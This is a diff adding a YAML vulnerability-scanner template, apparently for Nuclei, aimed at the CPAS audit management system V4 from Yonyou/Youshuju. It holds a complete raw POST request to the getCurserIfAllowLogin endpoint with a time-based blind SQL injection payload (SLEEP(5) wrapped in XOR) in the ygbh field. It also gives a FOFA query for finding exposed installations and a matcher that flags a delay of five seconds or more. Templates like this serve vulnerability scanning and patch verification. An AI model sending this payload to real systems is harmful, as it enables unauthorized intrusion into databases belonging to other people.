@@ -1,0 +1,45 @@
+id: poc-zo6ogozmu0aknmqn
+info:
+  name: 用友-友数聚科技CPAS审计管理系统V4 getCurserIfAllowLogin 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zo6ogozmu0aknmqn
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zo6ogozmu0aknmqn
+    fofa: body="CPAS审计管理系统"
+http:
+- raw:
+  - 'POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 53
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/plain, */*; q=0.01
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: sid=18ed526f-a005-4184-8102-4cf2fb527083; username=adm11; password=; rememberme=0; autoSubmit=0
+
+    Connection: close
+
+
+    ygbh=adm11''XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR''Z'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
